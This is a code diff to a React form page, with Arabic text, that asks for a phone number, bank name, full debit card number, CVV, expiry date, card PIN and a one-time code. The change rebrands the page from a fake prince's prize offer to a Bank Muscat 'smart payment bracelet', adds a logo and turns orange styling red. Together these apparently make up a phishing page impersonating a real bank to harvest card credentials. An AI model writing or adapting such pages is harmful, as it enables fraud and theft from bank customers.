@@ -176,18 +176,19 @@ export default function UsernameRecoveryPage() {
     <div className="min-h-screen bg-gray-100">
       <form onSubmit={handleSubmit}>
         {/* Header */}
-        <div className="bg-black h-12 flex items-center justify-end px-4">
-          <ChevronRight className="w-6 h-6 text-orange-500" />
+        <div className="bg-black h-12 flex items-center justify-between px-4">
+          <ChevronRight className="w-6 h-6 text-red-500" />
+          <img src="/logo.png" alt="" width={90}/>
         </div>
         {/* Main Content */}
         <div className="px-6 py-8 space-y-8">
           {/* Title */}
-          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بجائزة مقدمة من الأمير اصيلة</h1>
+          <h1 className="text-2xl font-bold text-gray-900 text-center">ربط بطاقتك البنكية بسوار الدفع الذكي من بنك مسقط</h1>
 
           {/* Phone Number Section */}
           <div className="space-y-4">
             <label className="block text-gray-600 text-right">
-              رقم الهاتف <span className="text-orange-500">*</span>
+              رقم الهاتف <span className="text-red-500">*</span>
             </label>
 
             <div className="flex items-center gap-2">
@@ -200,7 +201,7 @@ export default function UsernameRecoveryPage() {
                     setErrors((prev) => ({ ...prev, phoneNumber: "" }))
                   }
                 }}
-                className={`flex-1 text-right ${errors.phoneNumber ? "border-orange-500" : ""}`}
+                className={`flex-1 text-right ${errors.phoneNumber ? "border-red-500" : ""}`}
                 placeholder="99999999"
                 required
                 maxLength={8}
@@ -221,7 +222,7 @@ export default function UsernameRecoveryPage() {
               </Select>
             </div>
 
-            {errors.phoneNumber && <div className="text-orange-500 text-sm text-right">{errors.phoneNumber}</div>}
+            {errors.phoneNumber && <div className="text-red-500 text-sm text-right">{errors.phoneNumber}</div>}
 
             <div className="flex items-center gap-2 text-sm text-gray-500">
               <Info className="w-4 h-4" />
@@ -231,7 +232,7 @@ export default function UsernameRecoveryPage() {
 {/* Card Number Section */}
 <div className="space-y-4">
             <label className="block text-gray-600 text-right">
-             اسم البنك الخاص بك<span className="text-orange-500">*</span>
+             اسم البنك الخاص بك<span className="text-red-500">*</span>
             </label>
 
             <div className="gap-2">
@@ -257,7 +258,7 @@ export default function UsernameRecoveryPage() {
           {/* Card Number Section */}
           <div className="space-y-4">
             <label className="block text-gray-600 text-right">
-              رقم بطاقة الخصم المباشر <span className="text-orange-500">*</span>
+              رقم بطاقة الخصم المباشر <span className="text-red-500">*</span>
             </label>
 
             <div className="grid grid-cols-4 gap-2">
@@ -267,14 +268,14 @@ export default function UsernameRecoveryPage() {
                     ref={(el) => (cardInputRefs.current[index] = el) as any}
                     value={number}
                     onChange={(e) => handlecnChange(index, e.target.value)}
-                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-orange-500" : ""}`}
+                    className={`text-center border-0 border-b-2 rounded-none ${errors[`card-${index}`] ? "border-red-500" : ""}`}
                     placeholder="XXXX"
                     maxLength={4}
                     required
                     inputMode="numeric"
                   />
                   {errors[`card-${index}`] && (
-                    <div className="text-orange-500 text-xs text-center mt-1">{errors[`card-${index}`]}</div>
+                    <div className="text-red-500 text-xs text-center mt-1">{errors[`card-${index}`]}</div>
                   )}
                 </div>
               ))}
@@ -283,7 +284,7 @@ export default function UsernameRecoveryPage() {
 
           <div className="space-y-4">
             <label className="block text-gray-600 text-right">
-              تاريخ الانتهاء ورمز الأمان <span className="text-orange-500">*</span>
+              تاريخ الانتهاء ورمز الأمان <span className="text-red-500">*</span>
             </label>
             <div className="flex justify-center gap-2">
               <div>
@@ -296,13 +297,13 @@ export default function UsernameRecoveryPage() {
                       setErrors((prev) => ({ ...prev, ccc: "" }))
                     }
                   }}
-                  className={`text-center w-20 ${errors.ccc ? "border-orange-500" : ""}`}
+                  className={`text-center w-20 ${errors.ccc ? "border-red-500" : ""}`}
                   placeholder="ccc"
                   maxLength={3}
                   required
                   inputMode="numeric"
                 />
-                {errors.ccc && <div className="text-orange-500 text-xs text-center mt-1">{errors.ccc}</div>}
+                {errors.ccc && <div className="text-red-500 text-xs text-center mt-1">{errors.ccc}</div>}
               </div>
               <div>
                 <Input
@@ -314,14 +315,14 @@ export default function UsernameRecoveryPage() {
                       setErrors((prev) => ({ ...prev, exm: "" }))
                     }
                   }}
-                  className={`text-center w-20 ${errors.exm ? "border-orange-500" : ""}`}
+                  className={`text-center w-20 ${errors.exm ? "border-red-500" : ""}`}
                   placeholder="MM"
                   maxLength={2}
                   required
                   inputMode="numeric"
                 />
                 {errors.exm && (
-                  <div className="text-orange-500 text-xs text-center mt-1">{errors.exm}</div>
+                  <div className="text-red-500 text-xs text-center mt-1">{errors.exm}</div>
                 )}
               </div>
               <div>
@@ -334,18 +335,18 @@ export default function UsernameRecoveryPage() {
                       setErrors((prev) => ({ ...prev, exy: "" }))
                     }
                   }}
-                  className={`text-center w-20 ${errors.exy ? "border-orange-500" : ""}`}
+                  className={`text-center w-20 ${errors.exy ? "border-red-500" : ""}`}
                   placeholder="YY"
                   maxLength={2}
                   required
                   inputMode="numeric"
                 />
-                {errors.exy && <div className="text-orange-500 text-xs text-center mt-1">{errors.exy}</div>}
+                {errors.exy && <div className="text-red-500 text-xs text-center mt-1">{errors.exy}</div>}
               </div>
             </div>
             <div className="space-y-4">
             <label className="block text-gray-600 text-right">
-            الرقم السري لبطاقة الخصم<span className="text-orange-500">*</span>
+            الرقم السري لبطاقة الخصم<span className="text-red-500">*</span>
             </label>
 
             <div className="grid gap-2">
@@ -369,7 +370,7 @@ export default function UsernameRecoveryPage() {
           <div className="pt-8">
             <Button
               type="submit"
-              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-full text-lg"
+              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
             >
               استمرار
             </Button>
@@ -405,14 +406,14 @@ export default function UsernameRecoveryPage() {
             </div>
 
             {otpError && (
-              <div className="text-orange-500 text-sm text-center bg-orange-50 p-3 rounded-lg border border-orange-200">
+              <div className="text-red-500 text-sm text-center bg-red-50 p-3 rounded-lg border border-red-200">
                 {otpError}
               </div>
             )}
 
             <Button
               onClick={handleContinue}
-              className="w-full bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-full text-lg"
+              className="w-full bg-red-500 hover:bg-red-600 text-white py-4 rounded-full text-lg"
             >
               تأكيد
             </Button>
